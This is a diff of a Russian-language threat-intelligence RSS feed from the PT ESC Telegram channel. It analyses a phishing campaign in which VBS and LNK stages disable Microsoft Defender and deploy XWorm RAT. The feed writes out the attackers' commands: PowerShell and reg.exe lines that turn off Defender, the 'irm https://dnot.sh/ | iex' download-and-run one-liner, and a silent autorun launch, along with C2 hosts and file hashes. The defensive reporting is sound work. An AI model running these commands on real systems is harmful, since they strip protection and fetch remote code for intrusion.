@@ -1,5 +1,68 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ESCalator</title><link>https://t.me/ptescalator</link><description>Tips and tricks Positive Technologies (PT ESC)</description><language>ru</language><lastBuildDate>Wed, 03 Dec 2025 11:57:53 +0000</lastBuildDate><item><title>He may not, as unvalued persons do, Carve for himself (W. Shakespeare)</title><link>https://t.me/ptescalator/562</link><description>He may not, as unvalued persons do, Carve for himself (W. Shakespeare)
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ESCalator</title><link>https://t.me/ptescalator</link><description>Tips and tricks Positive Technologies (PT ESC)</description><language>ru</language><lastBuildDate>Fri, 05 Dec 2025 14:00:47 +0000</lastBuildDate><item><title>В дополнение к посту 👆</title><link>https://t.me/ptescalator/575</link><description>В дополнение к посту 👆
+Отключение Defender / MpPreference
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableBlockAtFirstSeen $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableScriptScanning $true
+Add-MpPreference -ExclusionPath 'C:\ProgramData'
+Add-MpPreference -ExclusionPath $env:USERPROFILE'\Downloads'
+Модификация Defender через reg.exe
+reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f
+reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpynetReporting /t REG_DWORD /d 0 /f
+reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
+Defendnot
+#Директория по умолчанию
+C:\Prorgam Files\defendnot\
+#Скачивание и запуск Defendnot
+irm https://dnot.sh/ | iex
+#Запуск Defendnot в скрытном режиме и добавление задачи в автозагрузку из-под текущего пользователя
+"C:\Program Files\defendnot\defendnot-loader.exe" --silent --autorun-as-user
+IoCs:
+Defendnot
+dnot.sh
+734d301654affee77396b554ccb04e0e
+752e74a143212b9779aa98ec6f736bac
+C2 XWorm
+tcp.cloudpub.ru:56409
+fair-equation.gl.at.ply.gg:57489
+lnk-файлы
+aebad92d84ae4f4b64748bc94798d401
+abd0364a25d1e7ee2bc9320c74e125fc
+powershell-файлы
+087dbfed9667fb870af265aed35f82e3
+ef7b11685c154e54deaf5c26f6d8ea59
+85a98d0f58cf08cb7206286b51312661
+vbs\vbe-файлы
+0bbccecdd13c7b9c4af3273b1ae8e133
+ebcb3e0d61ed5774d4e336f5e96ee9b4
+9c5a00fe40783497752bcfbd75937fa7
+3ec80f2d06dd8f6a8e60d0e8753255e7
+xWorm
+48bed9e98053e1e3ce0d4fb21fda2804
+cab6f558f996db5a80e2a3bd5d443154
+82294c916ba0ab95382509f51724716a
+092712dc61fce5ef0ad0ddebb90059be
+#TI #Phishing #malware #win
+@ptescalator</description><pubDate>Fri, 05 Dec 2025 14:00:47 +0000</pubDate><guid isPermaLink="false">telegram_ptescalator_575</guid></item><item><title>Использование DefendNot в атаках с XWorm 🪱</title><link>https://t.me/ptescalator/568</link><description>Использование DefendNot в атаках с XWorm 🪱
+Группа киберразведки зафиксировала фишинговую активность, целью которой являлась кража данных с последующим вымогательством денежных средств (скриншот 1). В ходе анализа были идентифицированы две параллельно используемые злоумышленниками цепочки доставки, различающиеся по начальному вектору, но сходящиеся на единой инфраструктуре и финальном вредоносном компоненте.
+🌹 Отдельно примечателен выбор инфраструктуры: для распространения компонентов используется GitHub-репозиторий death-note. Забавно, что автор отсылает к известному произведению Death Note, где старшеклассник получает в руки особую тетрадь.
+• В первой цепочке в качестве первичного стейджа использовались VBScript-файлы (скриншот 2), содержащие обфусцированный скрипт. После запуска жертвой VBS-файла происходило скачивание с GitHub-репозитория злоумышленника текстового файла-приманки (скриншот 3) и его запуск для создания видимости легитимного процесса, а также выгрузка и запуск вредоносного VBE-скрипта «SCRRC4ryuk.vbe» (скриншот 4).
+Указанный скрипт выполнял деактивацию средств защиты Windows, в том числе Microsoft Defender с использованием проекта DefendNot, а также дропал и запускал дополнительный модуль telegram_worker.vbs, отвечающий за скрытую съемку экрана и отправку скриншотов в Telegram с использованием API и бота. Дополнительно перед запуском DefendNot злоумышленники выполняли ряд PowerShell-команд, таких как Set-MpPreference и Add-MpPreference, для отключения механизмов защиты и добавления в исключения каталогов, где размещаются и запускаются вредоносы.
+После этого запускался DefendNot, который регистрирует фиктивный антивирус через Windows Security Center и переводит Defender в отключенное состояние штатными средствами ОС. Завершающим этапом из того же репозитория загружался и запускался исполняемый файл, идентифицированный как XWorm RAT.
+• Во второй цепочке в начальном стейдже использовались LNK-файлы. Ярлык либо напрямую загружал и исполнял PowerShell-скрипт из GitHub-репозитория, либо выполнял эквивалентную команду в Base64-представлении (скриншот 4). Запущенный PowerShell-скрипт (скриншот 5) создавал текстовый файл, заполнял его псевдослужебным (скриншот 3) содержимым и открывал для пользователя, маскируя вредоносную активность под офисный документооборот. После этого скрипт загружал из того же GitHub-репозитория файл SCRRC4ryuk.vbe с последующим запуском. Дальнейшие стадии полностью совпадают с первой цепочкой и также приводят к развертыванию XWorm RAT на рабочей станции жертвы.
+🕵️ Изучив метаданные семплов XWorm, нам удалось обнаружить более ранние атаки, датируемые концом сентября, где вместо GitHub-репозитория распространение ВПО осуществлялось через облачные файловые хранилища, такие как Dropbox, Box и Яндекс.Диск. Это может свидетельствовать об эволюции инфраструктуры распространения и постепенном смещении акцента в сторону GitHub как удобной и менее подозрительной для пользователя площадки доставки.
+💡 Отдельного внимания заслуживает использование DefendNot. Изначально он позиционируется как открытый PoC-проект, демонстрирующий возможность регистрации фиктивного антивируса в Windows Security Center и последующего штатного отключения Microsoft Defender без эксплуатации уязвимостей. Базовый сценарий установки и запуска сводится к однострочной команде PowerShell вида:
+irm https://dnot.sh/ | iex
+С ее помощью загружается установочный скрипт, скачивается и распаковывается архив, после чего PoC разворачивается в каталоге C:\Program Files\defendnot\ и запускается. В процессе работы DefendNot добавляет себя в автозагрузку текущего пользователя, сохраняя эффект отключения Defender после перезагрузки.
+На практике подобные инструменты ранее практически не встречались в реальных атаках, поэтому задокументированное использование DefendNot в кампании указывает на растущую заинтересованность злоумышленников в переиспользовании публичных исследовательских разработок для отключения встроенных средств защиты.
+#TI #Phishing #malware #win
+@ptescalator
+
+[Media: Фото]</description><pubDate>Fri, 05 Dec 2025 13:58:39 +0000</pubDate><guid isPermaLink="false">telegram_ptescalator_568</guid></item><item><title>He may not, as unvalued persons do, Carve for himself (W. Shakespeare)</title><link>https://t.me/ptescalator/562</link><description>He may not, as unvalued persons do, Carve for himself (W. Shakespeare)
 При расследовании в инфраструктуре, подвергшейся шифрованию, регулярно возникает необходимость извлечения данных из образов дисков, где файловая система существенно повреждена.
 В таких случаях извлечь данные MFT, логи ОС или юзерские артефакты в состоянии, пригодном для обработки классическими инструментами, возможно далеко не всегда. Это порождает необходимость применения карвинга — восстановления или реконструкции поврежденных файлов. В ряде случаев доступные коммерческие инструменты, реализующие данную технику, дают неплохие результаты, но в целом имеют достаточно ограниченную область применения.
 В случае карвинга событий журналов ОС Windows хорошо зарекомендовала себя техника «забудь про BinXML»: для полноценного декодирования содержимого полей единичного события необходимы шаблоны, хранящиеся в заголовке чанка, который по понятным причинам может просто отсутствовать. Не пытаясь даже искать такие шаблоны, можно составить текстовое описание единичного события, где однозначно выделяются даты, хранимые в стандартных расположениях, коды событий и несколько других служебных полей, а также декодируемые «как текст» (с вырезанием служебных последовательностей BinXML) байтовые последовательности, содержащие данные для подстановки в шаблоны.
